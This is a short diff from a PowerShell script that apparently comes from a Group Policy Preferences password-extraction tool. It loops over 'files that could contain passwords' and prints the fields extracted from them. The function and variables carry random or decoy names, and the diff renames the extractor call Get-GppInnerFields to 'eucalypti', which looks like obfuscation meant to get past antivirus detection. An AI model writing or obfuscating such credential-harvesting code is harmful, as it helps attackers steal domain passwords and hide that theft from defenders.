@@ -89,7 +89,7 @@ function amazon
         Write-Verbose "Found $($vpW9mlOuymLFBVJ | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
     
         foreach ($File in $vpW9mlOuymLFBVJ) {
-                $eCYfqvgThjEzkRo = (Get-GppInnerFields $File.Fullname)
+                $eCYfqvgThjEzkRo = (eucalypti $File.Fullname)
                 Write-Output $eCYfqvgThjEzkRo
         }
     }
